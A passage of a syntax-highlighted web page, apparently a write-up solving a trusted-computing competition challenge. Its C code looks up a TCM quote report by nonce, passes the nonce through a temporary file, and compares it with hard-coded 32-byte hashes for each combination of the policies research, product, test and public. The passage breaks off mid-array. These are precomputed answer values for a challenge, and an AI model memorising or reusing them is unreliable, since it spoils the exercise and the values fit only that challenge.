</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;public&#34;</span>,<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;return_value&#34;</span>:<span style="color:#e6db74">&#34;8b4877c3ffbda4dfe506785e8cbeedeb7364b50b2b8b4a0fc4c0d53a1bae0fc7&#34;</span>,<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>因为这里策略有顺序要求 <code>research|product|test|public</code>，于是采用计算 15 个哈希值对其进行校验。然后输出相应结果即可。​
编写代码如下：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#75715e">// general quote_report from (TCM_PIK_DESC,QUOTE_REPORT)​
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>{<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    RECORD(MESSAGE,INSTANCE_INFO) <span style="color:#f92672">*</span> instance_info;<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    RECORD(TCM_PIK_DESC,PCRQUOTE) <span style="color:#f92672">*</span> quote_report;<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// get quote nonce value​
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    printf(<span style="color:#e6db74">&#34;key_manage: enter quote report get process!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    RECORD(GENERAL_RETURN,UUID) <span style="color:#f92672">*</span> external_data <span style="color:#f92672">=</span> msg_expand<span style="color:#f92672">-&gt;</span>expand;<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    db_record <span style="color:#f92672">=</span> memdb_find_first(TYPE_PAIR(TCM_PIK_DESC,PCRQUOTE),<span style="color:#e6db74">&#34;nonce&#34;</span>,external_data<span style="color:#f92672">-&gt;</span>return_value);<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>        FILE <span style="color:#f92672">*</span>file<span style="color:#f92672">=</span>fopen(<span style="color:#e6db74">&#34;/home/player/tcmenv_question/src/test.txt&#34;</span>,<span style="color:#e6db74">&#34;w&#34;</span>);<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> k<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>(k<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;k<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">32</span>;k<span style="color:#f92672">++</span>){<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>        fprintf(file,<span style="color:#e6db74">&#34;%d &#34;</span>,external_data<span style="color:#f92672">-&gt;</span>return_value[k]);<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    }<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    fclose(file);<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(db_record <span style="color:#f92672">==</span> NULL)<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    {<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>        printf(<span style="color:#e6db74">&#34;key_manage: can&#39;t find quote report!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span>EINVAL;<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    }<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    quote_report <span style="color:#f92672">=</span> db_record<span style="color:#f92672">-&gt;</span>record;<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(quote_report <span style="color:#f92672">==</span> NULL)<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span>EINVAL;<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    ret <span style="color:#f92672">=</span> message_add_expand_data(recv_msg,TYPE_PAIR(TCM_PIK_DESC,PCRQUOTE),quote_report);<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    ret<span style="color:#f92672">=</span>ex_module_sendmsg(sub_proc,recv_msg);<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> ret;<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>}<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>FILE <span style="color:#f92672">*</span>file1<span style="color:#f92672">=</span>fopen(<span style="color:#e6db74">&#34;/home/player/tcmenv_question/src/test.txt&#34;</span>,<span style="color:#e6db74">&#34;r&#34;</span>);<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> m<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>,number;<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span> abc[<span style="color:#ae81ff">33</span>];<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span>(m<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;m<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">32</span>;m<span style="color:#f92672">++</span>){<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    fscanf(file1,<span style="color:#e6db74">&#34;%d&#34;</span>,<span style="color:#f92672">&amp;</span>number);<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    abc[m]<span style="color:#f92672">=</span>(<span style="color:#66d9ef">char</span>)number;<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>}<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>abc[<span style="color:#ae81ff">32</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(memcmp(quote_report<span style="color:#f92672">-&gt;</span>nonce,abc,<span style="color:#ae81ff">32</span>)<span style="color:#f92672">!=</span><span style="color:#ae81ff">0</span>)<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>{<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    strcpy(solve_result, <span style="color:#e6db74">&#34;error&#34;</span>);<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>}<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span> {<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> zero[<span style="color:#ae81ff">32</span>] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>};<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> research[<span style="color:#ae81ff">32</span>] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0x81</span>,<span style="color:#ae81ff">0xe2</span>,<span style="color:#ae81ff">0x1b</span>,<span style="color:#ae81ff">0xc2</span>,<span style="color:#ae81ff">0x48</span>,<span style="color:#ae81ff">0x7c</span>,<span style="color:#ae81ff">0x1a</span>,<span style="color:#ae81ff">0x17</span>,<span style="color:#ae81ff">0x9f</span>,<span style="color:#ae81ff">0xfc</span>,<span style="color:#ae81ff">0xdb</span>,<span style="color:#ae81ff">0xd3</span>,<span style="color:#ae81ff">0x89</span>,<span style="color:#ae81ff">0xf6</span>,<span style="color:#ae81ff">0xc3</span>,<span style="color:#ae81ff">0xf1</span>,<span style="color:#ae81ff">0xa3</span>,<span style="color:#ae81ff">0x02</span>,<span style="color:#ae81ff">0xcd</span>,<span style="color:#ae81ff">0x26</span>,<span style="color:#ae81ff">0x8f</span>,<span style="color:#ae81ff">0x0c</span>,<span style="color:#ae81ff">0x93</span>,<span style="color:#ae81ff">0x78</span>,<span style="color:#ae81ff">0xd0</span>,<span style="color:#ae81ff">0x83</span>,<span style="color:#ae81ff">0x9f</span>,<span style="color:#ae81ff">0xc6</span>,<span style="color:#ae81ff">0xa0</span>,<span style="color:#ae81ff">0x8f</span>,<span style="color:#ae81ff">0xd5</span>,<span style="color:#ae81ff">0xea</span>};<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> product[<span style="color:#ae81ff">32</span>] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0xb2</span>,<span style="color:#ae81ff">0x0a</span>,<span style="color:#ae81ff">0x7a</span>,<span style="color:#ae81ff">0x25</span>,<span style="color:#ae81ff">0xc7</span>,<span style="color:#ae81ff">0x31</span>,<span style="color:#ae81ff">0xd3</span>,<span style="color:#ae81ff">0x1b</span>,<span style="color:#ae81ff">0x1c</span>,<span style="color:#ae81ff">0x2f</span>,<span style="color:#ae81ff">0xdf</span>,<span style="color:#ae81ff">0xe7</span>,<span style="color:#ae81ff">0xcd</span>,<span style="color:#ae81ff">0xc4</span>,<span style="color:#ae81ff">0xc5</span>,<span style="color:#ae81ff">0x3f</span>,<span style="color:#ae81ff">0x84</span>,<span style="color:#ae81ff">0x6c</span>,<span style="color:#ae81ff">0x1b</span>,<span style="color:#ae81ff">0x9c</span>,<span style="color:#ae81ff">0x0e</span>,<span style="color:#ae81ff">0x49</span>,<span style="color:#ae81ff">0xbb</span>,<span style="color:#ae81ff">0x36</span>,<span style="color:#ae81ff">0x2b</span>,<span style="color:#ae81ff">0x73</span>,<span style="color:#ae81ff">0x41</span>,<span style="color:#ae81ff">0x5a</span>,<span style="color:#ae81ff">0xa3</span>,<span style="color:#ae81ff">0x84</span>,<span style="color:#ae81ff">0xce</span>,<span style="color:#ae81ff">0xab</span>};<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> test[<span style="color:#ae81ff">32</span>] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0xed</span>,<span style="color:#ae81ff">0x7b</span>,<span style="color:#ae81ff">0x0f</span>,<span style="color:#ae81ff">0xd0</span>,<span style="color:#ae81ff">0xcb</span>,<span style="color:#ae81ff">0x59</span>,<span style="color:#ae81ff">0x0d</span>,<span style="color:#ae81ff">0x68</span>,<span style="color:#ae81ff">0xd6</span>,<span style="color:#ae81ff">0xb6</span>,<span style="color:#ae81ff">0xf1</span>,<span style="color:#ae81ff">0xfe</span>,<span style="color:#ae81ff">0x10</span>,<span style="color:#ae81ff">0x81</span>,<span style="color:#ae81ff">0x1e</span>,<span style="color:#ae81ff">0x57</span>,<span style="color:#ae81ff">0x7c</span>,<span style="color:#ae81ff">0xde</span>,<span style="color:#ae81ff">0x4f</span>,<span style="color:#ae81ff">0x74</span>,<span style="color:#ae81ff">0x17</span>,<span style="color:#ae81ff">0xef</span>,<span style="color:#ae81ff">0xc4</span>,<span style="color:#ae81ff">0xe8</span>,<span style="color:#ae81ff">0x59</span>,<span style="color:#ae81ff">0x93</span>,<span style="color:#ae81ff">0xe0</span>,<span style="color:#ae81ff">0xff</span>,<span style="color:#ae81ff">0x9a</span>,<span style="color:#ae81ff">0xbf</span>,<span style="color:#ae81ff">0x89</span>,<span style="color:#ae81ff">0x16</span>};<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> public[<span style="color:#ae81ff">32</span>] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0x62</span>,<span style="color:#ae81ff">0xc8</span>,<span style="color:#ae81ff">0x08</span>,<span style="color:#ae81ff">0xfd</span>,<span style="color:#ae81ff">0x91</span>,<span style="color:#ae81ff">0x4c</span>,<span style="color:#ae81ff">0xe4</span>,<span style="color:#ae81ff">0x47</span>,<span style="color:#ae81ff">0x7b</span>,<span style="color:#ae81ff">0xc3</span>,<span style="color:#ae81ff">0xc5</span>,<span style="color:#ae81ff">0xe6</span>,<span style="color:#ae81ff">0x22</span>,<span style="color:#ae81ff">0x96</span>,<span style="color:#ae81ff">0x8b</span>,<span style="color:#ae81ff">0x5d</span>,<span style="color:#ae81ff">0x5f</span>,<span style="color:#ae81ff">0xbe</span>,<span style="color:#ae81ff">0xad</span>,<span style="color:#ae81ff">0xa4</span>,<span style="color:#ae81ff">0x45</span>,<span style="color:#ae81ff">0x7e</span>,<span style="color:#ae81ff">0x91</span>,<span style="color:#ae81ff">0x1f</span>,<span style="color:#ae81ff">0xa0</span>,<span style="color:#ae81ff">0x0d</span>,<span style="color:#ae81ff">0x34</span>,<span style="color:#ae81ff">0x4a</span>,<span style="color:#ae81ff">0xba</span>,<span style="color:#ae81ff">0xab</span>,<span style="color:#ae81ff">0x80</span>,<span style="color:#ae81ff">0x70</span>};<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> researchproduct[<span style="color:#ae81ff">32</span>] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0x20</span>,<span style="color:#ae81ff">0x80</span>,<span style="color:#ae81ff">0xb4</span>,<span style="color:#ae81ff">0xb0</span>,<span style="color:#ae81ff">0xb3</span>,<span style="color:#ae81ff">0xba</span>,<span style="color:#ae81ff">0xc7</span>,<span style="color:#ae81ff">0xd2</span>,<span style="color:#ae81ff">0x86</span>,<span style="color:#ae81ff">0x42</span>,<span style="color:#ae81ff">0xb0</span>,<span style="color:#ae81ff">0xa9</span>,<span style="color:#ae81ff">0x54</span>,<span style="color:#ae81ff">0x9b</span>,<span style="color:#ae81ff">0xe2</span>,<span style="color:#ae81ff">0xdc</span>,<span style="color:#ae81ff">0x9e</span>,<span style="color:#ae81ff">0x77</span>,<span style="color:#ae81ff">0x54</span>,<span style="color:#ae81ff">0xb7</span>,<span style="color:#ae81ff">0x0d</span>,<span style="color:#ae81ff">0x3b</span>,<span style="color:#ae81ff">0x96</span>,<span style="color:#ae81ff">0x2d</span>,<span style="color:#ae81ff">0xbe</span>,<span style="color:#ae81ff">0xee</span>,<span style="color:#ae81ff">0xe3</span>,<span style="color:#ae81ff">0x1b</span>,<span style="color:#ae81ff">0x17</span>,<span style="color:#ae81ff">0xcb</span>,<span style="color:#ae81ff">0x88</span>,<span style="color:#ae81ff">0x43</span>};<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> researchtest[<span style="color:#ae81ff">32</span>] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0x3e</span>,<span style="color:#ae81ff">0x0d</span>,<span style="color:#ae81ff">0x14</span>,<span style="color:#ae81ff">0x5e</span>,<span style="color:#ae81ff">0x2d</span>,<span style="color:#ae81ff">0xbe</span>,<span style="color:#ae81ff">0x16</span>,<span style="color:#ae81ff">0xba</span>,<span style="color:#ae81ff">0xa3</span>,<span style="color:#ae81ff">0x2b</span>,<span style="color:#ae81ff">0x8e</span>,<span style="color:#ae81ff">0xec</span>,<span style="color:#ae81ff">0xef</span>,<span style="color:#ae81ff">0xed</span>,<span style="color:#ae81ff">0x02</span>,<span style="color:#ae81ff">0xe7</span>,<span style="color:#ae81ff">0x45</span>,<span style="color:#ae81ff">0x82</span>,<span style="color:#ae81ff">0x94</span>,<span style="color:#ae81ff">0x7b</span>,<span style="color:#ae81ff">0x75</span>,<span style="color:#ae81ff">0xe5</span>,<span style="color:#ae81ff">0xbd</span>,<span style="color:#ae81ff">0xbb</span>,<span style="color:#ae81ff">0x42</span>,<span style="color:#ae81ff">0x3c</span>,<span style="color:#ae81ff">0xb1</span>,<span style="color:#ae81ff">0x71</span>,<span style="color:#ae81ff">0xc0</span>,<span style="color:#ae81ff">0xa5</span>,<span style="color:#ae81ff">0x33</span>,<span style="color:#ae81ff">0x3d</span>};<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> researchpublic[<span style="color:#ae81ff">32</span>] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0xad</span>,<span style="color:#ae81ff">0x10</span>,<span style="color:#ae81ff">0x5b</span>,<span style="color:#ae81ff">0x3b</span>,<span style="color:#ae81ff">0x59</span>,<span style="color:#ae81ff">0xd2</span>,<span style="color:#ae81ff">0xde</span>,<span style="color:#ae81ff">0x78</span>,<span style="color:#ae81ff">0x55</span>,<span style="color:#ae81ff">0xa8</span>,<span style="color:#ae81ff">0x08</span>,<span style="color:#ae81ff">0xca</span>,<span style="color:#ae81ff">0x8a</span>,<span style="color:#ae81ff">0x74</span>,<span style="color:#ae81ff">0x63</span>,<span style="color:#ae81ff">0x72</span>,<span style="color:#ae81ff">0x62</span>,<span style="color:#ae81ff">0x57</span>,<span style="color:#ae81ff">0x38</span>,<span style="color:#ae81ff">0x23</span>,<span style="color:#ae81ff">0xfe</span>,<span style="color:#ae81ff">0xdb</span>,<span style="color:#ae81ff">0xcd</span>,<span style="color:#ae81ff">0x59</span>,<span style="color:#ae81ff">0xbd</span>,<span style="color:#ae81ff">0x28</span>,<span style="color:#ae81ff">0xfb</span>,<span style="color:#ae81ff">0x79</span>,<span style="color:#ae81ff">0x15</span>,<span style="color:#ae81ff">0x5f</span>,<span style="color:#ae81ff">0xb4</span>,<span style="color:#ae81ff">0x4d</span>};<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> researchtestpublic[<span style="color:#ae81ff">32</span>] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0xdc</span>,<span style="color:#ae81ff">0xcb</span>,<span style="color:#ae81ff">0x92</span>,<span style="color:#ae81ff">0xf5</span>,<span style="color:#ae81ff">0x64</span>,<span style="color:#ae81ff">0x75</span>,<span style="color:#ae81ff">0xa7</span>,<span style="color:#ae81ff">0xa9</span>,<span style="color:#ae81ff">0xa3</span>,<span style="color:#ae81ff">0xd1</span>,<span style="color:#ae81ff">0x3d</span>,<span style="color:#ae81ff">0x49</span>,<span style="color:#ae81ff">0x0d</span>,<span style="color:#ae81ff">0x91</span>,<span style="color:#ae81ff">0x5a</span>,<span style="color:#ae81ff">0x97</span>,<span style="color:#ae81ff">0x9e</span>,<span style="color:#ae81ff">0xc4</span>,<span style="color:#ae81ff">0x4e</span>,<span style="color:#ae81ff">0x4c</span>,<span style="color:#ae81ff">0x7d</span>,<span style="color:#ae81ff">0xfb</span>,<span style="color:#ae81ff">0xf5</span>,<span style="color:#ae81ff">0x89</span>,<span style="color:#ae81ff">0x78</span>,<span style="color:#ae81ff">0x48</span>,<span style="color:#ae81ff">0xf4</span>,<span style="color:#ae81ff">0x98</span>,<span style="color:#ae81ff">0xe4</span>,<span style="color:#ae81ff">0x85</span>,<span style="color:#ae81ff">0x8c</span>,<span style="color:#ae81ff">0xdf</span>};<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> researchproductpublic[<span style="color:#ae81ff">32</span>] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0x8f</span>,<span style="color:#ae81ff">0x8b</span>,<span style="color:#ae81ff">0x61</span>,<span style="color:#ae81ff">0x7d</span>,<span style="color:#ae81ff">0x08</span>,<span style="color:#ae81ff">0xf5</span>,<span style="color:#ae81ff">0xd2</span>,<span style="color:#ae81ff">0x0e</span>,<span style="color:#ae81ff">0x51</span>,<span style="color:#ae81ff">0xed</span>,<span style="color:#ae81ff">0xfd</span>,<span style="color:#ae81ff">0x96</span>,<span style="color:#ae81ff">0x50</span>,<span style="color:#ae81ff">0xb0</span>,<span style="color:#ae81ff">0x28</span>,<span style="color:#ae81ff">0x99</span>,<span style="color:#ae81ff">0xd4</span>,<span style="color:#ae81ff">0x69</span>,<span style="color:#ae81ff">0x75</span>,<span style="color:#ae81ff">0x09</span>,<span style="color:#ae81ff">0xe7</span>,<span style="color:#ae81ff">0xc7</span>,<span style="color:#ae81ff">0x7f</span>,<span style="color:#ae81ff">0xe4</span>,<span style="color:#ae81ff">0xa1</span>,<span style="color:#ae81ff">0x89</span>,<span style="color:#ae81ff">0xf9</span>,<span style="color:#ae81ff">0x94</span>,<span style="color:#ae81ff">0x97</span>,<span style="color:#ae81ff">0xcb</span>,<span style="color:#ae81ff">0x95</span>,<span style="color:#ae81ff">0x9a</span>};<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> researchproducttest[<span style="color:#ae81ff">32</span>] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0xdd</span>,<span style="color:#ae81ff">0x86</span>,<span style="color:#ae81ff">0xde</span>,<span style="color:#ae81ff">0x23</span>,<span style="color:#ae81ff">0xac</span>,<span style="color:#ae81ff">0x9b</span>,<span style="color:#ae81ff">0x75</span>,<span style="color:#ae81ff">0x30</span>,<span style="color:#ae81ff">0xca</span>,<span style="color:#ae81ff">0x52</span>,<span style="color:#ae81ff">0xec</span>,<span style="color:#ae81ff">0x2a</span>,<span style="color:#ae81ff">0xc4</span>,<span style="color:#ae81ff">0x98</span>,<span style="color:#ae81ff">0x2f</span>,<span style="color:#ae81ff">0x07</span>,<span style="color:#ae81ff">0xdf</span>,<span style="color:#ae81ff">0x55</span>,<span style="color:#ae81ff">0xe4</span>,<span style="color:#ae81ff">0xbd</span>,<span style="color:#ae81ff">0xe5</span>,<span style="color:#ae81ff">0xa7</span>,<span style="color:#ae81ff">0xd5</span>,<span style="color:#ae81ff">0x98</span>,<span style="color:#ae81ff">0x78</span>,<span style="color:#ae81ff">0xab</span>,<span style="color:#ae81ff">0xa9</span>,<span style="color:#ae81ff">0x39</span>,<span style="color:#ae81ff">0x60</span>,<span style="color:#ae81ff">0x9e</span>,<span style="color:#ae81ff">0xa2</span>,<span style="color:#ae81ff">0x8e</span>};<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> producttest[<span style="color:#ae81ff">32</span>] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0x2c</span>,<span style="color:#ae81ff">0x2d</span>,<span style="color:#ae81ff">0xc5</span>,<span style="color:#ae81ff">0x73</span>,<span style="color:#ae81ff">0xdc</span>,<span style="color:#ae81ff">0x11</span>,<span style="color:#ae81ff">0xac</span>,<span style="color:#ae81ff">0x66</span>,<span style="color:#ae81ff">0xb3</span>,<span style="color:#ae81ff">0x2c</span>,<span style="color:#ae81ff">0x33</span>,<span style="color:#ae81ff">0x7e</span>,<span style="color:#ae81ff">0x38</span>,<span style="color:#ae81ff">0x47</span>,<span style="color:#ae81ff">0xdd</span>,<span style="color:#ae81ff">0x9d</span>,<span style="color:#ae81ff">0x7e</span>,<span style="color:#ae81ff">0x6d</span>,<span style="color:#ae81ff">0x93</span>,<span style="color:#ae81ff">0x25</span>,<span style="color:#ae81ff">0xfd</span>,<span style="color:#ae81ff">0x8b</span>,<span style="color:#ae81ff">0x7f</span>,<span style="color:#ae81ff">0x1b</span>,<span style="color:#ae81ff">0xb6</span>,<span style="color:#ae81ff">0xb6</span>,<span style="color:#ae81ff">0x2f</span>,<span style="color:#ae81ff">0xcf</span>,<span style="color:#ae81ff">0xf6</span>,<span style="color:#ae81ff">0xa6</span>,<span style="color:#ae81ff">0x0e</span>,<span style="color:#ae81ff">0x5b</span>};<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> productpublic[<span style="color:#ae81ff">32</span>] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0x0a</span>,<span style="color:#ae81ff">0x19</span>,<span style="color:#ae81ff">0xf1</span>,<span style="color:#ae81ff">0x13</span>,<span style="color:#ae81ff">0x98</span>,<span style="color:#ae81ff">0xce</span>,<span style="color:#ae81ff">0xdf</span>,<span style="color:#ae81ff">0xf0</span>,<span style="color:#ae81ff">0x9d</span>,<span style="color:#ae81ff">0x1c</span>,<span style="color:#ae81ff">0x35</span>,<span style="color:#ae81ff">0x95</span>,<span style="color:#ae81ff">0x60</span>,<span style="color:#ae81ff">0x26</span>,<span style="color:#ae81ff">0x97</span>,<span style="color:#ae81ff">0xaf</span>,<span style="color:#ae81ff">0x89</span>,<span style="color:#ae81ff">0x2b</span>,<span style="color:#ae81ff">0xdc</span>,<span style="color:#ae81ff">0x09</span>,<span style="color:#ae81ff">0xbd</span>,<span style="color:#ae81ff">0xdf</span>,<span style="color:#ae81ff">0x1e</span>,<span style="color:#ae81ff">0x9e</span>,<span style="color:#ae81ff">0x85</span>,<span style="color:#ae81ff">0xf0</span>,<span style="color:#ae81ff">0xa0</span>,<span style="color:#ae81ff">0x73</span>,<span style="color:#ae81ff">0x91</span>,<span style="color:#ae81ff">0xc3</span>,<span style="color:#ae81ff">0x54</span>,<span style="color:#ae81ff">0x5b</span>};<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> producttestpublic[<span style="color:#ae81ff">32</span>] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0xc5</span>,<span style="color:#ae81ff">0x01</span>,<span style="color:#ae81ff">0xba</span>,<span style="color:#ae81ff">0x81</span>,<span style="color:#ae81ff">0x3c</span>,<span style="color:#ae81ff">0xa3</span>,<span style="color:#ae81ff">0x86</span>,<span style="color:#ae81ff">0x2a</span>,<span style="color:#ae81ff">0x3b</span>,<span style="color:#ae81ff">0xdf</span>,<span style="color:#ae81ff">0x14</span>,<span style="color:#ae81ff">0xa2</span>,<span style="color:#ae81ff">0x34</span>,<span style="color:#ae81ff">0x12</span>,<span style="color:#ae81ff">0x41</span>,<span style="color:#ae81ff">0xe9</span>,<span style="color:#ae81ff">0xe2</span>,<span style="color:#ae81ff">0x97</span>,<span style="color:#ae81ff">0x9f</span>,<span style="color:#ae81ff">0xee</span>,<span style="color:#ae81ff">0xaf</span>,<span style="color:#ae81ff">0x27</span>,<span style="color:#ae81ff">0x90</span>,<span style="color:#ae81ff">0x22</span>,<span style="color:#ae81ff">0x73</span>,<span style="color:#ae81ff">0x53</span>,<span style="color:#ae81ff">0x9f</span>,<span style="color:#ae81ff">0x8e</span>,<span style="color:#ae81ff">0x0f</span>,<span style="color:#ae81ff">0xde</span>,<span style="color:#ae81ff">0x4f</span>,<span style="color:#ae81ff">0x2a</span>};<span style="color:#960050;background-color:#1e0010">​</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> testpublic[<span style="color:#ae81ff">32</span>] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0xc8</span>,<span style="color:#ae81ff">0x11</span>,<span style="color:#ae81ff">0xe3</span>,<span style="color:#ae81ff">0x69</span>,<span style="color:#ae81ff">0x89</span>,<span style="color:#ae81ff">0xc2</span>,<span style="color:#ae81ff">0x50</span>,<span style="color:#ae81ff">0x9f</span>,<span style="color:#ae81ff">0xc1</span>,<span style="color:#ae81ff">0x9a</span>,<span style="color:#ae81ff">0xd3</span>,<span style="color:#ae81ff">0xc7</span>,<span style="color:#ae81ff">0xcf</span>,<span style="color:#ae81ff">0xac</span>,<span style="color:#ae81ff">0x5f</span>,<span style="color:#ae81ff">0x0f</span>,<span style="color:#ae81ff">0x69</span>,<span style="color:#ae81ff">0xfa</span>,<span style="color:#ae81ff">0x23</span>,<span style="color:#ae81ff">0xde</span>,<span style="color:#ae81ff">0x40</span>,<span style="color:#ae81ff">0xce</span>,<span style="color:#ae81ff">0x03</span>,<span style="color:#ae81ff">0x90</span>,<span style="color:#ae81ff">0x44</span>,<span style="color:#ae81ff">0x3b</span>,<span 